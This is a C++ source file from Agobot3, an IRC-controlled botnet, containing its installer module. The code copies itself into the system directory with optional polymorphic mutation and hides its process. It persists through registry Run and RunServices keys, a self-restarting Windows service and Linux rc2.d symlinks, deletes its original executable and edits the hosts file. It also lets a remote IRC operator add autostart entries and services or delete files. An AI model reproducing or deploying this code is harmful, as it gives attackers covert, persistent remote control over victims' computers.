/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "installer.h"
#include "mainctrl.h"

void CInstaller::Init() {
#ifdef WIN32
	REGCMD(m_cmdAsAdd,	"inst.asadd",	"adds an autostart entry",		false,	this);
	REGCMD(m_cmdAsDel,	"inst.asdel",	"deletes an autostart entry",	false,	this);
	REGCMD(m_cmdSvcAdd,	"inst.svcadd",	"adds a service to scm",		false,	this);
	REGCMD(m_cmdSvcDel,	"inst.svcdel",	"deletes a service from scm",	false,	this);
#endif // WIN32
}

#ifdef WIN32
RSP fRegisterServiceProcess;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;

HANDLE psnap;
PROCESSENTRY32 pe32;

#endif // WIN32

int GetCopies(CString &sFilename)
{
#ifdef WIN32
	char cFilename[MAX_PATH]; GetModuleFileName(GetModuleHandle(NULL), cFilename, sizeof(cFilename));
	if(fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next)
	{	psnap=fCreateToolhelp32Snapshot(2, 0);
		if(psnap!=INVALID_HANDLE_VALUE)
		{	int copies=0; pe32.dwSize=sizeof(PROCESSENTRY32);
			if(fProcess32First(psnap, &pe32))
			{	do {	if((strncmp(cFilename+(strlen(cFilename)-strlen(pe32.szExeFile)), \
						pe32.szExeFile, strlen(pe32.szExeFile))==0) || \
						(strncmp(sFilename, pe32.szExeFile, strlen(pe32.szExeFile))==0))
							copies++;
				} while(fProcess32Next(psnap, &pe32)); }
			CloseHandle(psnap);
			return copies; }
		else return 0; }
	else return 0;
#else
	char szCmdBuf[4096]; sprintf(szCmdBuf, "ps ax | grep %s | grep -v grep > psaxtemp", sFilename.CStr());
	system(szCmdBuf); FILE *fp=fopen("psaxtemp", "r"); if(!fp) return 0;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize>0) return 1;
	fclose(fp); system("rm -f psaxtemp"); return 0;
#endif // WIN32
}

bool CInstaller::CopyToSysDir(CString &sFilename)
{
	char tstr[MAX_PATH];
#ifdef WIN32
	CString sysdir; GetSystemDirectory(sysdir.GetBuffer(MAX_PATH), MAX_PATH);
	m_sSysDir.Assign(sysdir.CStr());
	CString cfilename; GetModuleFileName(GetModuleHandle(NULL), cfilename.GetBuffer(MAX_PATH), MAX_PATH);

	HINSTANCE kernel32_dll=LoadLibrary("kernel32.dll");
	if(kernel32_dll)
	{	fRegisterServiceProcess=(RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot=(CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First=(P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next=(P32N)GetProcAddress(kernel32_dll, "Process32Next");
		if(fRegisterServiceProcess) fRegisterServiceProcess(0, 1); }
#else
	m_sSysDir.Assign("/usr/sbin");
	CString sysdir(m_sSysDir);
	CString cfilename(g_pMainCtrl->m_sArgv0);
#endif // WIN32

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "Checking for multiple copies...\n");
#endif // DBGCONSOLE
	if(!g_pMainCtrl->m_cCmdLine.m_cConfig.bUpdate && !g_pMainCtrl->m_cCmdLine.m_cConfig.bService)
	{
		unsigned long lStartTime=GetTickCount(); bool bFound=true;
		while((GetTickCount()-lStartTime) < 60000 && bFound)
		{	if(GetCopies(sFilename)<2) bFound=false; Sleep(1000);
		}
		if(bFound) {
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(5, "Found 2 copies, exiting...\n");
#endif // DBGCONSOLE
			exit(1); }
	}

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "First copy running...\n");
#endif // DBGCONSOLE
	long lTimeoutStart;

	if(!cfilename.Find(sFilename.CStr(), 0))
		if(g_pMainCtrl->m_cCmdLine.m_cConfig.bUpdate)
			KillProcess(sFilename.CStr());

	if(!cfilename.Find(sysdir, 0) || cfilename.Find("winhlpp32.exe", 0))
#ifdef LINUX
	if(!cfilename.Find(sFilename, 0))
#endif // LINUX
	{	sprintf(tstr, "%s%c%s", sysdir.CStr(), DIRCHAR, sFilename.CStr());

		lTimeoutStart=GetTickCount();

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "Trying to copy to system directory...\n");
#endif // DBGCONSOLE

		// FIXME::BAD!!!
#ifdef WIN32
		if(g_pMainCtrl->m_cBot.inst_polymorph.bValue) {
			// Polymorph here
			if(!g_pMainCtrl->m_cPolymorph.DoPolymorph(cfilename, tstr))
			{	// Fall back to copying if this didnt work
				while(CopyFile(cfilename, tstr, false)==false &&
					GetTickCount()-lTimeoutStart < 25000) Sleep(2000); }
		} else {
			// Without Polymorph
			while(CopyFile(cfilename, tstr, false)==false &&
				GetTickCount()-lTimeoutStart < 25000) Sleep(2000);
		}
#else
		char szCmdBuf[MAX_PATH]; sprintf(szCmdBuf, "cp %s %s", cfilename.CStr(), tstr);
		system(szCmdBuf);
#endif // WIN32

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "Finished copying to system directory...\n");
#endif // DBGCONSOLE

#ifndef _DEBUG

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "Starting new process...\n");
#endif // DBGCONSOLE

		if(g_pMainCtrl->m_cBot.bot_meltserver.bValue) {
			strncat(tstr, " -meltserver \"", sizeof(tstr));
			strncat(tstr, cfilename.CStr(), sizeof(tstr));
			strncat(tstr, "\"", sizeof(tstr));
		}

#ifdef WIN32
		PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo); sinfo.wShowWindow = SW_HIDE;
		if(CreateProcess(NULL, tstr, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
			exit(0); }
#else 
		sprintf(szCmdBuf, "%s 2>&1 > /dev/null 2>&1 &", tstr);
		system(szCmdBuf);
		exit(0);
#endif // WIN32

#endif // _DEBUG
	}
	return true;
}

bool CInstaller::Install()
{	if(g_pMainCtrl->m_cCmdLine.m_cConfig.bMeltServer)
		DeleteFile(g_pMainCtrl->m_cCmdLine.m_cConfig.szOldServer);

	// Add hosts to the hosts file
#ifdef _WIN32
	AddHosts();
#else
	int iDistro=GetDistro(); char *szRC2Path=NULL;
	switch(iDistro) {
	case LINUX_TYPE_SUSE:
		szRC2Path="/etc/rc.d/rc2.d";
		break;
	case LINUX_TYPE_REDHAT:
	case LINUX_TYPE_DEBIAN:
	default:
		szRC2Path="/etc/rc2.d";
		break;
	}
	
	if(szRC2Path) {
		// Add bot autostart here
		CString sFileName("/usr/sbin/"), sCmdBuf, sRCFileName(szRC2Path);
		sFileName.Append(g_pMainCtrl->m_cBot.bot_filename.sValue.CStr());
		sRCFileName.Append("/S99"); sRCFileName.Append(g_pMainCtrl->m_cBot.bot_filename.sValue.CStr());
		DeleteFile(sRCFileName.CStr());
		sCmdBuf.Format("ln -s %s %s", sFileName.CStr(), sRCFileName.CStr());
		system(sCmdBuf.CStr()); }
#endif // _WIN32
	
	return true; }

bool CInstaller::Uninstall()
{
#ifdef WIN32
/*
	HANDLE f; DWORD r;
	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	char cmdline[MAX_PATH]; char tcmdline[MAX_PATH]; char cfilename[MAX_PATH];
	char batfile[MAX_PATH]; char tempdir[MAX_PATH];

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
*/
  	exit(1);
#else
	// Linux
	int iDistro=GetDistro(); char *szRC2Path=NULL;
	switch(iDistro) {
	case LINUX_TYPE_SUSE:
		szRC2Path="/etc/rc.d/rc2.d";
		break;
	case LINUX_TYPE_REDHAT:
	case LINUX_TYPE_DEBIAN:
	default:
		szRC2Path="/etc/rc2.d";
		break;
	}
	
	if(szRC2Path) {
		// Delete bot autostart here
		CString sRCFileName(szRC2Path);
		sRCFileName.Append("/S99"); sRCFileName.Append(g_pMainCtrl->m_cBot.bot_filename.sValue.CStr());
		DeleteFile(sRCFileName.CStr()); }
	exit(1);
#endif // WIN32
	return true;
}

#ifdef WIN32

bool CInstaller::RegStartAdd(CString &sValuename, CString &sFilename) {
	// Fail if the hash check failed
	if(g_pMainCtrl->m_bHashCheckFailed) return false;

	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename.CStr(), 0, REG_SZ, (LPBYTE)(const char *)sFilename.CStr(), (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename.CStr(), 0, REG_SZ, (LPBYTE)(const char *)sFilename.CStr(), (DWORD)strlen(sFilename)); 
	RegCloseKey(key);

	return true; }

bool CInstaller::RegStartDel(CString &sValuename) {
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename.CStr()); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename.CStr()); 
	RegCloseKey(key); 

	return true; }

bool CInstaller::ServiceAdd(CString &sServicename, CString &sFilename) {
	// Fail if the hash check failed
	if(g_pMainCtrl->m_bHashCheckFailed) return false;

	CString sysdir; GetSystemDirectory(sysdir.GetBuffer(MAX_PATH), MAX_PATH);
	CString sSvcCmd; sSvcCmd.Format("%s\\%s", sysdir.CStr(), sFilename.CStr());
	CString sSvcParams; sSvcParams.Format("-service");
	return ServiceAddInt(sServicename, sSvcCmd, sSvcParams); }

bool CInstaller::ServiceAddInt(CString &sServicename, CString &sFilename, CString &sParams) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	CString sSvcCmd; sSvcCmd.Format("\"%s\" %s", sFilename.CStr(), sParams.CStr());
	SC_HANDLE hService=CreateService(hServiceControl, sServicename.CStr(),
		g_pMainCtrl->m_cBot.as_valname.sValue.CStr(), SERVICE_ALL_ACCESS, \
		SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, \
		sSvcCmd.CStr(), NULL, NULL, NULL, NULL, NULL);
	if(!hService) {
		DWORD dwError=GetLastError();
		if(dwError==ERROR_SERVICE_EXISTS) {
			ServiceDel(sServicename); CloseServiceHandle(hService);
			CloseServiceHandle(hServiceControl);
			return ServiceAdd(sServicename, sFilename);
		} else {
			CloseServiceHandle(hServiceControl); return false; }
	}

	SC_ACTION scActions[1]; scActions[0].Delay=1; scActions[0].Type=SC_ACTION_RESTART;
	SERVICE_FAILURE_ACTIONS sfActions; sfActions.dwResetPeriod=INFINITE; sfActions.lpRebootMsg=NULL;
	sfActions.lpCommand=NULL; sfActions.cActions=1; sfActions.lpsaActions=scActions;

	if(!ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfActions)) {
		CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return false;
	}

	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return true;
}

bool CInstaller::IsInstalled(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);

	return true;
}

bool CInstaller::ServiceStart(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	StartService(hService, 0, NULL);
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); 

/*	CString sCmdBuf; sCmdBuf.Format("net start %s", sServicename.CStr());
	system(sCmdBuf.CStr());*/

	return true;
}

#endif // WIN32

bool CInstaller::HandleCommand(CMessage *pMsg) {
#ifdef WIN32
	if(!pMsg->sCmd.Compare("inst.asadd")) {
		CString sValue=pMsg->sChatString.Token(1, " ", true);
		CString sFile=pMsg->sChatString.Token(2, " ", true);
		if(RegStartAdd(sValue, sFile))
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"Added registry autostart value \"%s\" as \"%s\".", sValue.CStr(), sFile.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare("inst.asdel")) {
		CString sValue=pMsg->sChatString.Token(1, " ", true);
		if(RegStartDel(sValue))
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"Deleted registry autostart value \"%s\".", sValue.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare("inst.svcadd")) {
		CString sService=pMsg->sChatString.Token(1, " ", true);
		CString sFile=pMsg->sChatString.Token(2, " ", true);
		CString sParams=pMsg->sChatString.Token(3, " ", true);
		if(ServiceAddInt(sService, sFile, sParams))
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"Added service with name \"%s\" as \"\"%s\" %s\".", sService.CStr(), sFile.CStr(), sParams.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare("inst.svcdel")) {
		CString sService=pMsg->sChatString.Token(1, " ", true);
		if(ServiceDel(sService))
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"Deleted service with name \"%s\".", sService.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare("file.del")) {
		CString sFile=pMsg->sChatString.Token(1, " ", true);
		if(DeleteFile(sFile))
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"File deleted: \"%s\".", sFile.CStr());
		return true; }
#endif // WIN32
	return false;
}
